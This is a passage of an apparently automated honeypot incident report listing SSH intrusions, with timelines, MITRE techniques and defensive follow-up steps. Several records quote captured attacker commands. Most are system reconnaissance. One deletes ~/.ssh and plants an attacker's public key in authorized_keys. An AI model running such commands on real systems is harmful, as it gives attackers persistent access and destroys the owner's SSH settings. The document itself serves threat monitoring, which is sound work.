| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:08:02` | `cowrie.session.connect` |
| `2026-07-11 06:08:02` | `cowrie.client.version` |
| `2026-07-11 06:08:02` | `cowrie.client.kex` |
| `2026-07-11 06:08:03` | `cowrie.login.success` |
| `2026-07-11 06:08:04` | `cowrie.session.params` |
| `2026-07-11 06:08:04` | `cowrie.command.input` |
| `2026-07-11 06:08:04` | `cowrie.command.input` |
| `2026-07-11 06:08:04` | `cowrie.command.input` |
| `2026-07-11 06:08:04` | `cowrie.command.input` |
| `2026-07-11 06:08:04` | `cowrie.command.input` |
| `2026-07-11 06:08:04` | `cowrie.command.success` |
| `2026-07-11 06:08:04` | `cowrie.command.input` |
| `2026-07-11 06:08:04` | `cowrie.command.input` |
| `2026-07-11 06:08:04` | `cowrie.command.input` |
| `2026-07-11 06:08:04` | `cowrie.command.input` |
| `2026-07-11 06:08:04` | `cowrie.log.closed` |
| `2026-07-11 06:08:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d8316680752

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:09 |
| **Last Seen** | 2026-07-11 06:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:09:55` | `cowrie.session.connect` |
| `2026-07-11 06:09:55` | `cowrie.client.version` |
| `2026-07-11 06:09:55` | `cowrie.client.kex` |
| `2026-07-11 06:09:56` | `cowrie.login.success` |
| `2026-07-11 06:09:58` | `cowrie.session.params` |
| `2026-07-11 06:09:58` | `cowrie.command.input` |
| `2026-07-11 06:09:58` | `cowrie.command.input` |
| `2026-07-11 06:09:58` | `cowrie.command.input` |
| `2026-07-11 06:09:58` | `cowrie.command.input` |
| `2026-07-11 06:09:58` | `cowrie.command.input` |
| `2026-07-11 06:09:58` | `cowrie.command.success` |
| `2026-07-11 06:09:58` | `cowrie.command.input` |
| `2026-07-11 06:09:58` | `cowrie.command.input` |
| `2026-07-11 06:09:58` | `cowrie.command.input` |
| `2026-07-11 06:09:58` | `cowrie.command.input` |
| `2026-07-11 06:09:58` | `cowrie.log.closed` |
| `2026-07-11 06:09:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7172cc0eb03

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:11 |
| **Last Seen** | 2026-07-11 06:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:11:48` | `cowrie.session.connect` |
| `2026-07-11 06:11:48` | `cowrie.client.version` |
| `2026-07-11 06:11:48` | `cowrie.client.kex` |
| `2026-07-11 06:11:49` | `cowrie.login.success` |
| `2026-07-11 06:11:50` | `cowrie.session.params` |
| `2026-07-11 06:11:50` | `cowrie.command.input` |
| `2026-07-11 06:11:50` | `cowrie.command.input` |
| `2026-07-11 06:11:50` | `cowrie.command.input` |
| `2026-07-11 06:11:50` | `cowrie.command.input` |
| `2026-07-11 06:11:50` | `cowrie.command.input` |
| `2026-07-11 06:11:50` | `cowrie.command.success` |
| `2026-07-11 06:11:50` | `cowrie.command.input` |
| `2026-07-11 06:11:50` | `cowrie.command.input` |
| `2026-07-11 06:11:50` | `cowrie.command.input` |
| `2026-07-11 06:11:50` | `cowrie.command.input` |
| `2026-07-11 06:11:51` | `cowrie.log.closed` |
| `2026-07-11 06:11:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d06f284c7535

| Field | Detail |
|---|---|
| **Source IP** | `124.88.174[.]143` |
| **First Seen** | 2026-07-11 06:11 |
| **Last Seen** | 2026-07-11 06:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:11:50` | `cowrie.session.connect` |
| `2026-07-11 06:11:52` | `cowrie.client.version` |
| `2026-07-11 06:11:52` | `cowrie.client.kex` |
| `2026-07-11 06:11:54` | `cowrie.login.success` |
| `2026-07-11 06:11:55` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.88.174[.]143` to AbuseIPDB if not already reported
- [ ] Block `124.88.174[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9c9ede5cd13

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:13 |
| **Last Seen** | 2026-07-11 06:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:13:40` | `cowrie.session.connect` |
| `2026-07-11 06:13:40` | `cowrie.client.version` |
| `2026-07-11 06:13:40` | `cowrie.client.kex` |
| `2026-07-11 06:13:40` | `cowrie.login.success` |
| `2026-07-11 06:13:42` | `cowrie.session.params` |
| `2026-07-11 06:13:42` | `cowrie.command.input` |
| `2026-07-11 06:13:42` | `cowrie.command.input` |
| `2026-07-11 06:13:42` | `cowrie.command.input` |
| `2026-07-11 06:13:42` | `cowrie.command.input` |
| `2026-07-11 06:13:42` | `cowrie.command.input` |
| `2026-07-11 06:13:42` | `cowrie.command.success` |
| `2026-07-11 06:13:42` | `cowrie.command.input` |
| `2026-07-11 06:13:42` | `cowrie.command.input` |
| `2026-07-11 06:13:42` | `cowrie.command.input` |
| `2026-07-11 06:13:42` | `cowrie.command.input` |
| `2026-07-11 06:13:42` | `cowrie.log.closed` |
| `2026-07-11 06:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f5809f379d7

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]251` |
| **First Seen** | 2026-07-11 06:15 |
| **Last Seen** | 2026-07-11 06:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:15:13` | `cowrie.session.connect` |
| `2026-07-11 06:15:14` | `cowrie.client.version` |
| `2026-07-11 06:15:14` | `cowrie.client.kex` |
| `2026-07-11 06:15:16` | `cowrie.login.success` |
| `2026-07-11 06:15:17` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:15:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]251` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4512bc526251

| Field | Detail |
|---|---|
| **Source IP** | `92.62.74[.]41` |
| **First Seen** | 2026-07-11 06:15 |
| **Last Seen** | 2026-07-11 06:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:15:23` | `cowrie.session.connect` |
| `2026-07-11 06:15:23` | `cowrie.client.version` |
| `2026-07-11 06:15:23` | `cowrie.client.kex` |
| `2026-07-11 06:15:24` | `cowrie.login.success` |
| `2026-07-11 06:15:25` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.62.74[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.62.74[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98ba2dd07761

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:15 |
| **Last Seen** | 2026-07-11 06:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:15:26` | `cowrie.session.connect` |
| `2026-07-11 06:15:27` | `cowrie.client.version` |
| `2026-07-11 06:15:27` | `cowrie.client.kex` |
| `2026-07-11 06:15:28` | `cowrie.login.success` |
| `2026-07-11 06:15:28` | `cowrie.session.params` |
| `2026-07-11 06:15:28` | `cowrie.command.input` |
| `2026-07-11 06:15:28` | `cowrie.command.input` |
| `2026-07-11 06:15:28` | `cowrie.command.input` |
| `2026-07-11 06:15:28` | `cowrie.command.input` |
| `2026-07-11 06:15:28` | `cowrie.command.input` |
| `2026-07-11 06:15:28` | `cowrie.command.success` |
| `2026-07-11 06:15:28` | `cowrie.command.input` |
| `2026-07-11 06:15:28` | `cowrie.command.input` |
| `2026-07-11 06:15:28` | `cowrie.command.input` |
| `2026-07-11 06:15:28` | `cowrie.command.input` |
| `2026-07-11 06:15:29` | `cowrie.log.closed` |
| `2026-07-11 06:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d502405cf47e

| Field | Detail |
|---|---|
| **Source IP** | `183.104.220[.]84` |
| **First Seen** | 2026-07-11 06:15 |
| **Last Seen** | 2026-07-11 06:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:15:30` | `cowrie.session.connect` |
| `2026-07-11 06:15:31` | `cowrie.client.version` |
| `2026-07-11 06:15:31` | `cowrie.client.kex` |
| `2026-07-11 06:15:33` | `cowrie.login.success` |
| `2026-07-11 06:15:34` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:15:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.104.220[.]84` to AbuseIPDB if not already reported
- [ ] Block `183.104.220[.]84` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-824f385dd828

| Field | Detail |
|---|---|
| **Source IP** | `187.8.3[.]230` |
| **First Seen** | 2026-07-11 06:16 |
| **Last Seen** | 2026-07-11 06:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:16:06` | `cowrie.session.connect` |
| `2026-07-11 06:16:07` | `cowrie.client.version` |
| `2026-07-11 06:16:07` | `cowrie.client.kex` |
| `2026-07-11 06:16:09` | `cowrie.login.success` |
| `2026-07-11 06:16:09` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:16:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.3[.]230` to AbuseIPDB if not already reported
- [ ] Block `187.8.3[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec7fd5c23610

| Field | Detail |
|---|---|
| **Source IP** | `117.71.53[.]210` |
| **First Seen** | 2026-07-11 06:16 |
| **Last Seen** | 2026-07-11 06:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:16:19` | `cowrie.session.connect` |
| `2026-07-11 06:16:20` | `cowrie.client.version` |
| `2026-07-11 06:16:20` | `cowrie.client.kex` |
| `2026-07-11 06:16:23` | `cowrie.login.success` |
| `2026-07-11 06:16:24` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:16:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.71.53[.]210` to AbuseIPDB if not already reported
- [ ] Block `117.71.53[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-612d4fddbc99

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 06:16 |
| **Last Seen** | 2026-07-11 06:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:16:25` | `cowrie.session.connect` |
| `2026-07-11 06:16:25` | `cowrie.client.version` |
| `2026-07-11 06:16:25` | `cowrie.client.kex` |
| `2026-07-11 06:16:26` | `cowrie.login.success` |
| `2026-07-11 06:16:27` | `cowrie.session.params` |
| `2026-07-11 06:16:27` | `cowrie.command.input` |
| `2026-07-11 06:16:27` | `cowrie.log.closed` |
| `2026-07-11 06:16:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58788cf77fe6

| Field | Detail |
|---|---|
| **Source IP** | `216.155.93[.]75` |
| **First Seen** | 2026-07-11 06:16 |
| **Last Seen** | 2026-07-11 06:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:16:30` | `cowrie.session.connect` |
| `2026-07-11 06:16:30` | `cowrie.client.version` |
| `2026-07-11 06:16:31` | `cowrie.client.kex` |
| `2026-07-11 06:16:31` | `cowrie.login.success` |
| `2026-07-11 06:16:32` | `cowrie.session.params` |
| `2026-07-11 06:16:32` | `cowrie.command.input` |
| `2026-07-11 06:16:32` | `cowrie.command.failed` |
| `2026-07-11 06:16:32` | `cowrie.log.closed` |
| `2026-07-11 06:16:33` | `cowrie.session.params` |
| `2026-07-11 06:16:33` | `cowrie.command.input` |
| `2026-07-11 06:16:33` | `cowrie.session.file_download` |
| `2026-07-11 06:16:33` | `cowrie.log.closed` |
| `2026-07-11 06:16:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.155.93[.]75` to AbuseIPDB if not already reported
- [ ] Block `216.155.93[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca1dade3c1ba

| Field | Detail |
|---|---|
| **Source IP** | `216.155.93[.]75` |
| **First Seen** | 2026-07-11 06:16 |
| **Last Seen** | 2026-07-11 06:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:16:33` | `cowrie.session.connect` |
| `2026-07-11 06:16:33` | `cowrie.client.version` |
| `2026-07-11 06:16:34` | `cowrie.client.kex` |
| `2026-07-11 06:16:34` | `cowrie.login.success` |
| `2026-07-11 06:16:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.155.93[.]75` to AbuseIPDB if not already reported
- [ ] Block `216.155.93[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f9a3a7f3016

| Field | Detail |
|---|---|
| **Source IP** | `216.155.93[.]75` |
| **First Seen** | 2026-07-11 06:16 |
| **Last Seen** | 2026-07-11 06:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:16:35` | `cowrie.session.connect` |
| `2026-07-11 06:16:35` | `cowrie.client.version` |
| `2026-07-11 06:16:35` | `cowrie.client.kex` |
| `2026-07-11 06:16:35` | `cowrie.login.success` |
| `2026-07-11 06:16:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.155.93[.]75` to AbuseIPDB if not already reported
- [ ] Block `216.155.93[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cad5436c6bc9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:17 |
| **Last Seen** | 2026-07-11 06:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:17:12` | `cowrie.session.connect` |
| `2026-07-11 06:17:12` | `cowrie.client.version` |
| `2026-07-11 06:17:12` | `cowrie.client.kex` |
| `2026-07-11 06:17:13` | `cowrie.login.success` |
| `2026-07-11 06:17:14` | `cowrie.session.params` |
| `2026-07-11 06:17:14` | `cowrie.command.input` |
| `2026-07-11 06:17:14` | `cowrie.command.input` |
| `2026-07-11 06:17:14` | `cowrie.command.input` |
| `2026-07-11 06:17:14` | `cowrie.command.input` |
| `2026-07-11 06:17:14` | `cowrie.command.input` |
| `2026-07-11 06:17:14` | `cowrie.command.success` |
| `2026-07-11 06:17:14` | `cowrie.command.input` |
| `2026-07-11 06:17:14` | `cowrie.command.input` |
| `2026-07-11 06:17:14` | `cowrie.command.input` |
| `2026-07-11 06:17:14` | `cowrie.command.input` |
| `2026-07-11 06:17:14` | `cowrie.log.closed` |
| `2026-07-11 06:17:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3518fa74ed4d

| Field | Detail |
|---|---|
| **Source IP** | `207.175.50[.]16` |
| **First Seen** | 2026-07-11 06:18 |
| **Last Seen** | 2026-07-11 06:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:18:58` | `cowrie.session.connect` |
| `2026-07-11 06:18:58` | `cowrie.login.success` |
| `2026-07-11 06:18:59` | `cowrie.session.params` |
| `2026-07-11 06:18:59` | `cowrie.command.input` |
| `2026-07-11 06:18:59` | `cowrie.command.input` |
| `2026-07-11 06:18:59` | `cowrie.command.failed` |
| `2026-07-11 06:18:59` | `cowrie.command.input` |
| `2026-07-11 06:18:59` | `cowrie.log.closed` |
| `2026-07-11 06:18:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.50[.]16` to AbuseIPDB if not already reported
- [ ] Block `207.175.50[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53a271ab1bc9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:19 |
| **Last Seen** | 2026-07-11 06:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:19:04` | `cowrie.session.connect` |
| `2026-07-11 06:19:04` | `cowrie.client.version` |
| `2026-07-11 06:19:04` | `cowrie.client.kex` |
